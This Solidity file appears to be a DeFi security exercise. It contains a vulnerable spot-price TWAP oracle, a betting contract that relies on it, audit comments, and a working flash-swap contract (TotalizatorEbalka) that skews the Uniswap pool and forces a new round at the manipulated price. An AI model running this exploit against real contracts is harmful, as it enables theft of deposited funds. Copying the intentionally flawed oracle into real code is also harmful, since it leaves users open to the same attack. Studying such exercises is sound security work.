// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import '../lib/openzeppelin-contracts/contracts/access/Ownable.sol';
import "../lib/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "forge-std/console.sol";

contract TWAPOracle {
    uint constant public min = 1 minutes;
    uint constant public MAX_LENGTH = 100;
    // 5
    uint public immutable length;
    address public immutable pair;
    uint[MAX_LENGTH] public ticks;
    // 0
    uint public round;
    // 0
    uint public lastUpdated;

    constructor (uint _length, address _pair) {
        require(_length < MAX_LENGTH, "big len" );
        length = _length;
        pair = _pair;
    }

    // @audit can we call update before uniswap is initialized?
    function update() external {
        if (lastUpdated != 0 && block.timestamp < lastUpdated + 5 * min) return;

        // base price is 20_000 * 10 ** 18
        uint price = _getPoolPrice();

        uint tickIndex = round % length;
        ticks[tickIndex] = price;
        round ++;
        lastUpdated = block.timestamp;
    }

    function _getPoolPrice() internal view returns (uint) {
        (uint stableCount, uint assetCount,) = IUniswapV2Pair(pair).getReserves();
        return 1e18 * stableCount / assetCount;
    }

    function getPrice() public view returns (uint) {
        uint avg = 0;
        if (round == 0) return 0;
        uint tickIndex = (round - 1) % length;
        uint samples = tickIndex + 1;
        for (int i = int(tickIndex); i >= 0; i--) {
            avg += ticks[uint(i)]; // * weight (if oracle uses weighted averages)       
        }

        if (round >= length) {
            samples = length;
            for (int i = int(length-1); i >= int(tickIndex); i--)
            {
                avg += ticks[uint(i)]; // * weight (if oracle uses weighted averages)            
            }
        }
        return avg / samples;
    }
}

contract SimpleToken is ERC20, Ownable {
    constructor(string memory name) ERC20(name, name) {}
    function mint(address to, uint amount) external onlyOwner {
        _mint(to, amount);
    }
}

contract Totalizator {

    uint constant public ROUND_INTERVAL = 1 hours;
    TWAPOracle public immutable oracle;

    uint public round;
    uint public totalDepositedUp;
    uint public totalDepositedDown;    
    uint public start;
    uint public price;
    uint public finalPrice;

    address public immutable btc;
    address public immutable usdt;    
    address public immutable token;

    mapping(uint => mapping(address => uint)) userUp;
    mapping(uint => mapping(address => uint)) userDown;    

    constructor (address pool, address _token,address _btc, address _usdt) {
        oracle = new TWAPOracle(5, pool);        
        token = _token;        
        btc = _btc;
        usdt = _usdt;
    }

    function newRound() external  {
        require(
          // never started
          start == 0 || 
          // ended half a round before call
          (start > 0 && start + ROUND_INTERVAL * 3/2 < block.timestamp), 
          "!bid" 
        );

        // @audit can be locked from updates
        oracle.update();

        round ++;
        price = oracle.getPrice();
        finalPrice = 0;
        start = block.timestamp;
        totalDepositedUp = 0;  
        totalDepositedDown = 0;        
    }

    function deposit(uint amount, bool up) external payable {
        require(
          // started once
          start > 0 && 
          // later than start
          block.timestamp > start && 
          // before end of 1/4 of round
          block.timestamp < start + ROUND_INTERVAL/4, 
          "!bid" 
        );

        // can be locked from updates
        oracle.update();

        IERC20(token).transferFrom(msg.sender, address(this), amount);

        if (up) {
            require( userDown[round][msg.sender] == 0, "only_up");            
            userUp[round][ msg.sender ] += amount;
            totalDepositedUp += amount;
        }
        else {
            require(userUp[round][msg.sender] == 0, "only_down");
            userDown[round][ msg.sender ] += amount;
            totalDepositedDown += amount;
        }
    }

    function claim() external payable {
        require( start > 0, "!round" );
        require( start + ROUND_INTERVAL < block.timestamp, "!finished" );     

        oracle.update();

        if (finalPrice == 0) {
            finalPrice = oracle.getPrice();            
        }   

        uint upUserDeposit = userUp[round][msg.sender];
        uint downUserDeposit = userDown[round][msg.sender];

        // price has be out of 0.1% range
        require(             
            totalDepositedUp + totalDepositedDown > 0 &&
            (
                (upUserDeposit > 0 && finalPrice >= price * 1001 / 1000) ||
                (downUserDeposit > 0 && finalPrice <= price * 999 / 1000)
            ), 
            "!winner" );


        userUp[round][msg.sender] = 0;
        userDown[round][msg.sender] = 0;        
        if (upUserDeposit > 0) {
            uint prize = IERC20(token).balanceOf(address(this)) * upUserDeposit / totalDepositedUp;
            IERC20(token).transfer(msg.sender, prize);
        }
        else {
            uint prize = IERC20(token).balanceOf(address(this)) * downUserDeposit / totalDepositedDown;
            IERC20(token).transfer(msg.sender, prize);
        }
    }    
}

contract TotalizatorEbalka {
  Totalizator totalizator;
  ERC20 tt;
  ERC20 usdt;
  ERC20 wbtc;
  TWAPOracle oracle;
  IUniswapV2Pair usdt_wbtc_pair;
  IUniswapV2Pair usdt_tt_pair;

  constructor(Totalizator _totalizator) {
    totalizator = _totalizator;
    tt = ERC20(totalizator.token());
    usdt = ERC20(totalizator.usdt());
    wbtc = ERC20(totalizator.btc());
    oracle = TWAPOracle(totalizator.oracle());
    usdt_wbtc_pair = IUniswapV2Pair(oracle.pair());
    usdt_tt_pair = IUniswapV2Pair(0x58A2cCDdFec438f2b1ACd907311bd0175ec02B7d);
  }

  function uniswapV2Call(
    address sender,
    uint amount0Out,
    uint amount1Out,
    bytes calldata data
  ) external {
    print_balances();

    swappyRight(
      usdt,
      wbtc,
      usdt_wbtc_pair
    );
    print_balances();

    totalizator.newRound();
    console.log('new round price', oracle.getPrice());

    swappyLeft(
      wbtc,
      usdt,
      usdt_wbtc_pair
    );
    print_balances();

    usdt.transfer(address(usdt_tt_pair), usdt.balanceOf(address(this)));
  }

  function ebatt() external {
    console.log('normal price', _getPoolPrice());
    usdt_tt_pair.swap(
      10_000_000 * 1e18,
      0,
      address(this),
      abi.encode(0)
    );
  }

  function print_balances() internal view {
    console.log('');
    console.log('# ebalka balances');
    console.log('tt', tt.balanceOf(address(this)), tt.balanceOf(address(this)) / 10 ** 18);
    console.log('usdt', usdt.balanceOf(address(this)), usdt.balanceOf(address(this)) / 10 ** 18);
    console.log('wbtc', wbtc.balanceOf(address(this)), wbtc.balanceOf(address(this)) / 10 ** 18);
    console.log('');
  }

  function _getPoolPrice() internal view returns (uint) {
      (uint stableCount, uint assetCount,) = IUniswapV2Pair(usdt_wbtc_pair).getReserves();
      return 1e18 * stableCount / assetCount;
  }

  function getWithdraw(
    ERC20 from,
    ERC20 to,
    IUniswapV2Pair pair
  ) internal view returns (uint) {
    uint fromAccBalance = from.balanceOf(address(this));
    uint fromPairBalance = from.balanceOf(address(pair));
    uint toPairBalance = to.balanceOf(address(pair));
    uint withdraw = toPairBalance - fromPairBalance * toPairBalance / (fromPairBalance + fromAccBalance) - 1;
    return withdraw;
  }

  function swappyRight(
    ERC20 from,
    ERC20 to,
    IUniswapV2Pair pair
  ) internal {
    uint withdraw = getWithdraw(from, to, pair);
    from.transfer(address(pair), from.balanceOf(address(this)));
    pair.swap(0, withdraw, address(this), new bytes(0));
  }

  function swappyLeft(
    ERC20 from,
    ERC20 to,
    IUniswapV2Pair pair
  ) internal {
    uint withdraw = getWithdraw(from, to, pair);
    from.transfer(address(pair), from.balanceOf(address(this)));
    pair.swap(withdraw, 0, address(this), new bytes(0));
  }
}